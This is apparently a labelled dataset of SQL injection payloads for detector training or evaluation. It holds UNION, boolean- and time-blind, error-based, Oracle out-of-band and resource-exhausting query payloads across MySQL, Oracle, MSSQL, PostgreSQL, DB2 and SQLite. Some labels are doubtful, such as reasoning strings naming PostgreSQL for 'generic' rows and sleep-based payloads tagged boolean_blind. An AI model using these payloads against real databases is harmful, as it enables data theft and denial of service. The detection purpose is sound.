id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23868,"-7749"" or ( 2689 = 7481 ) *7481",boolean_blind,generic,0.60,Boolean inequality with multiplication; no strong SQLi signal,1
23869,1 ) ) and 2886 = 1133--,boolean_blind,generic,0.70,Boolean inequality (2886 = 1133) for false branch testing,1
23870,1 ) where 9307 = 9307,boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality pattern,1
23871,"-4223' ) ) ) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 10-column injection,2
23872,select ( case when ( 1407 = 2741 ) then 1407 else 1407* ( select 1407 from mysql.db ) end ) #,error_based,mysql,0.80,CASE WHEN with mysql.db access detected → error_based SQLi; error trigger,1
23873,"-9606 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # iuij",error_based,oracle,0.95,Oracle CTXSYS.DRITHSX.SN detected → error_based SQLi; context search error,2
23874,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23875,-6823' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'lwlk' like 'lwlk,error_based,oracle,0.95,Oracle UTL_INADDR.get_host_address detected → error_based SQLi; network function,2
23876,"1' where 2160 = 2160 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.90,EXP() overflow detected → error_based SQLi; MySQL math error trigger,1
23877,-5820' ) ) as lkik where 4044 = 4044 or 7156 = 9197--,boolean_blind,generic,0.70,Boolean condition with inequality; blind branch testing,1
23878,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""jcgh"" = ""jcgh",error_based,mysql,0.85,ELT() with information_schema GROUP BY detected → error_based SQLi,1
23879,"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",time_blind,mysql,0.90,sleep() detected → time_blind SQLi; MySQL time-based delay function,2
23880,-5585' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),error_based,oracle,0.95,xmltype() cast detected → error_based SQLi; Oracle XML error,2
23881,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,time_blind,mysql,0.85,RLIKE with sleep() detected → time_blind SQLi; MySQL regex-based timing,2
23882,"1'+ ( select 'xqpe' where 4020 = 4020 union all select null,null--",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 2-column padding,2
23883,"-4849"" ) ) or ( 5005 = 9111 ) *9111 and ( ( ""catv"" like ""catv",boolean_blind,generic,0.60,Boolean inequality with multiplication; no strong SQLi signal,1
23884,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'mbxh' like 'mbxh",boolean_blind,mysql,0.80,ELT() with sleep() detected → boolean_blind SQLi; MySQL hybrid timing,1
23885,"1"" where 8732 = 8732",boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality,1
23886,-2411%' ) ) ) or 6872 = 6872 and ( ( ( '%' = ',boolean_blind,generic,0.70,Boolean equality (6872 = 6872) for true branch in blind SQLi,1
23887,1' ) and 4822 = 6997 and ( 'ojku' = 'ojku,boolean_blind,generic,0.70,Boolean inequality and equality; branch testing pattern,1
23888,-7950' ) or 9323 = 9323#,boolean_blind,generic,0.70,Boolean equality (9323 = 9323) for true branch testing,1
23889,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""oyuj"" = ""oyuj",error_based,mysql,0.85,EXP() overflow detected → error_based SQLi; MySQL math error,1
23890,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'opyt' = 'opyt",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23891,select pg_sleep ( 5 ) and ( ( '%' = ',time_blind,postgresql,0.95,pg_sleep() detected → time_blind SQLi; PostgreSQL timing function,2
23892,"1 where 2363 = 2363 union all select null,null,null,null,null--",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 5-column padding,2
23893,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'rdpv' = 'rdpv",error_based,mysql,0.85,ELT() with information_schema GROUP BY detected → error_based SQLi,1
23894,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eqyr' like 'eqyr",boolean_blind,db2,0.70,DB2 sysibm.systables Cartesian join; heavy boolean test,1
23895,"1%"" ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 6-column padding,2
23896,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ymnm' = 'ymnm,out_of_band,oracle,0.95,Oracle UTL_INADDR.get_host_address detected → out_of_band SQLi; network exfil,2
23897,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'mgfd' = 'mgfd,boolean_blind,generic,0.60,Boolean equality with multiplication; no strong SQLi signal,1
23898,"-3300' union all select 8979,8979,8979,8979,8979,8979--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 6-column injection,2
23899,"1%' union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 10-column padding,2
23900,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc",error_based,mysql,0.85,ELT() with GROUP BY detected → error_based SQLi; MySQL error trigger,1
23901,1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr,boolean_blind,generic,0.70,Boolean inequality (4069 = 8786) for false branch testing,1
23902,"1"" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",time_blind,mysql,0.90,sleep() in subquery detected → time_blind SQLi; MySQL timing function,2
23903,select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --,error_based,mssql,0.80,MSSQL master..sysdatabases access with CASE; error_based boolean,1
23904,-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 1-column injection,2
23905,select pg_sleep ( 5 ),time_blind,postgresql,0.95,pg_sleep() detected → time_blind SQLi; PostgreSQL timing function,2
23906,1' ) where 7903 = 7903,boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality,1
23907,"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,extractvalue() and BENCHMARK() detected → error_based SQLi; MySQL hybrid attack,2
23908,"1' ) as ssez where 5351 = 5351 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 5B iterations; CPU DoS,1
23909,-3895' ) or 8645 = 5359--,boolean_blind,generic,0.70,Boolean inequality (8645 = 5359) for false branch in blind SQLi,1
23910,"-2120"" ) union all select 9614--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 1-column injection,2
23911,1' ) and 7533 = 7533 and ( 'xyga' like 'xyga,boolean_blind,generic,0.70,Boolean equality (7533 = 7533) for true branch testing,1
23912,"1' ) as ssxj where 3845 = 3845 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.95,Oracle DBMS_PIPE.receive_message detected → time_blind SQLi; timing function,2
23913,"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""fkip"" = ""fkip",error_based,mssql,0.80,MSSQL CONVERT() to INT detected → error_based SQLi; type casting,1
23914,1 ) ) as rroe where 4840 = 4840,boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality,1
23915,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'vjkf' like 'vjkf",error_based,mysql,0.85,ELT() error trigger detected → error_based SQLi; MySQL overflow,1
23916,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dbxi"" like ""dbxi",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23917,"1"" ) as qmtx where 5280 = 5280 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.80,MSSQL sysusers Cartesian join (7x); heavy query DoS,1
23918,1%' ) and 2949 = 4847 and ( '%' = ',boolean_blind,generic,0.70,Boolean inequality (2949 = 4847) for false branch in blind SQLi,1
23919,"-1238' ) as lxur where 7075 = 7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 10-column injection,2
23920,1'|| ( select 'sliy' where 9494 = 9494,boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality,1
23921,-4610' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'hdco' = 'hdco,error_based,oracle,0.95,xmltype() cast detected → error_based SQLi; Oracle XML error,2
23922,-3966' ) or 7338 = 8657,boolean_blind,generic,0.70,Boolean inequality (7338 = 8657) for false branch in blind SQLi,1
23923,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 'squj' = 'squj",boolean_blind,db2,0.70,DB2 sysibm.systables Cartesian join; heavy boolean test,1
23924,"1%"" ) ) union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 6-column padding,2
23925,"1' ) where 8586 = 8586 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() with 250M argument detected → time_blind SQLi; SQLite DoS,2
23926,"1 ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.80,Oracle all_users Cartesian join (5x); heavy query DoS,1
23927,-4484' ) ) or 6872 = 6872 and ( ( 'oxuo' = 'oxuo,boolean_blind,generic,0.70,Boolean equality (6872 = 6872) for true branch in blind SQLi,1
23928,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 7700 = 7700",boolean_blind,db2,0.70,DB2 sysibm.systables Cartesian join; heavy boolean test,1
23929,"1 ) where 9469 = 9469 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23930,1 and ( 3020 = 3020 ) *6703,boolean_blind,generic,0.60,Boolean equality with multiplication; no strong SQLi signal,1
23931,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",error_based,mysql,0.85,ELT() with GROUP BY detected → error_based SQLi; MySQL error trigger,1
23932,"1%"" and 1343 = 5939#",boolean_blind,generic,0.70,Boolean inequality (1343 = 5939) for false branch in blind SQLi,1
23933,select pg_sleep ( 5 ) #,time_blind,postgresql,0.95,pg_sleep() detected → time_blind SQLi; PostgreSQL timing function,2
23934,"1"" where 2642 = 2642 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.80,DB2 sysibm.systables Cartesian join; heavy query DoS,1
23935,"1%' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = '",error_based,mssql,0.85,MSSQL CONVERT() to INT detected → error_based SQLi; type casting,1
23936,"1"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.95,pg_sleep() detected → time_blind SQLi; PostgreSQL timing function,2
23937,"-7202%"" ) ) union all select 2901#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 1-column injection,2
23938,"1%' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( '%' = '",heavy_query,db2,0.80,DB2 sysibm.systables Cartesian join; heavy query DoS,1
23939,-1280' ) ) or 8571 = 8571--,boolean_blind,generic,0.70,Boolean equality (8571 = 8571) for true branch in blind SQLi,1
23940,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'fjfo' = 'fjfo",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23941,"1"" ) where 2922 = 2922 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,mysql,0.80,ELT() with sleep() detected → boolean_blind SQLi; MySQL hybrid timing,1
